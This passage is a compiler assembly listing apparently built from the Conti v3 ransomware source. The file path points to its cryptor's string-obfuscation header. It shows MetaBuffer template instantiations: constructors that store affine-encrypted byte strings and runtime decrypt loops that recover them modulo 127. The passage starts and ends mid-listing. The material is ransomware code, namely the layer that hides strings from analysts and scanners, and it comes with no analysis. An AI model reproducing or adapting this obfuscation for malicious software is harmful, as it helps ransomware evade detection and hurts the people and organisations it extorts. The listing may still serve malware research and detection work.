  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 30	 sub	 ecx, 48			; 00000030H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 49	 mov	 BYTE PTR [rcx+1], 73	; 00000049H
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 6d	 mov	 BYTE PTR [rcx+3], 109	; 0000006dH
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 58	 mov	 BYTE PTR [rcx+5], 88	; 00000058H
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 58	 mov	 BYTE PTR [rcx+7], 88	; 00000058H
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 78	 mov	 BYTE PTR [rcx+9], 120	; 00000078H
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	c6 41 0b 64	 mov	 BYTE PTR [rcx+11], 100	; 00000064H
  0002f	c6 41 0c 30	 mov	 BYTE PTR [rcx+12], 48	; 00000030H
  00033	c6 41 0d 30	 mov	 BYTE PTR [rcx+13], 48	; 00000030H
  00037	c6 41 0e 30	 mov	 BYTE PTR [rcx+14], 48	; 00000030H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6d	 sub	 ecx, 109		; 0000006dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 02	 mov	 BYTE PTR [rcx+1], 2
  00007	c6 41 02 6d	 mov	 BYTE PTR [rcx+2], 109	; 0000006dH
  0000b	c6 41 03 6b	 mov	 BYTE PTR [rcx+3], 107	; 0000006bH
  0000f	c6 41 04 6d	 mov	 BYTE PTR [rcx+4], 109	; 0000006dH
  00013	c6 41 05 0e	 mov	 BYTE PTR [rcx+5], 14
  00017	c6 41 06 6d	 mov	 BYTE PTR [rcx+6], 109	; 0000006dH
  0001b	c6 41 07 0e	 mov	 BYTE PTR [rcx+7], 14
  0001f	c6 41 08 6d	 mov	 BYTE PTR [rcx+8], 109	; 0000006dH
  00023	c6 41 09 1f	 mov	 BYTE PTR [rcx+9], 31
  00027	c6 41 0a 6d	 mov	 BYTE PTR [rcx+10], 109	; 0000006dH
  0002b	c6 41 0b 31	 mov	 BYTE PTR [rcx+11], 49	; 00000031H
  0002f	c6 41 0c 6d	 mov	 BYTE PTR [rcx+12], 109	; 0000006dH
  00033	c6 41 0d 6d	 mov	 BYTE PTR [rcx+13], 109	; 0000006dH
  00037	c6 41 0e 6d	 mov	 BYTE PTR [rcx+14], 109	; 0000006dH
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 72	 sub	 ecx, 114		; 00000072H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4e	 mov	 BYTE PTR [rcx+1], 78	; 0000004eH
  00007	c6 41 02 72	 mov	 BYTE PTR [rcx+2], 114	; 00000072H
  0000b	c6 41 03 10	 mov	 BYTE PTR [rcx+3], 16
  0000f	c6 41 04 72	 mov	 BYTE PTR [rcx+4], 114	; 00000072H
  00013	c6 41 05 1f	 mov	 BYTE PTR [rcx+5], 31
  00017	c6 41 06 72	 mov	 BYTE PTR [rcx+6], 114	; 00000072H
  0001b	c6 41 07 1f	 mov	 BYTE PTR [rcx+7], 31
  0001f	c6 41 08 72	 mov	 BYTE PTR [rcx+8], 114	; 00000072H
  00023	c6 41 09 66	 mov	 BYTE PTR [rcx+9], 102	; 00000066H
  00027	c6 41 0a 72	 mov	 BYTE PTR [rcx+10], 114	; 00000072H
  0002b	c6 41 0b 50	 mov	 BYTE PTR [rcx+11], 80	; 00000050H
  0002f	c6 41 0c 72	 mov	 BYTE PTR [rcx+12], 114	; 00000072H
  00033	c6 41 0d 72	 mov	 BYTE PTR [rcx+13], 114	; 00000072H
  00037	c6 41 0e 72	 mov	 BYTE PTR [rcx+14], 114	; 00000072H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0e 00 00
	00		 mov	 r10d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 15 00 00 00	 mov	 eax, 21
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 71	 mov	 BYTE PTR [rcx+1], 113	; 00000071H
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 58	 mov	 BYTE PTR [rcx+3], 88	; 00000058H
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 5c	 mov	 BYTE PTR [rcx+5], 92	; 0000005cH
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 5c	 mov	 BYTE PTR [rcx+7], 92	; 0000005cH
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 5e	 mov	 BYTE PTR [rcx+9], 94	; 0000005eH
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	c6 41 0b 60	 mov	 BYTE PTR [rcx+11], 96	; 00000060H
  0002f	c6 41 0c 15	 mov	 BYTE PTR [rcx+12], 21
  00033	c6 41 0d 15	 mov	 BYTE PTR [rcx+13], 21
  00037	c6 41 0e 15	 mov	 BYTE PTR [rcx+14], 21
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
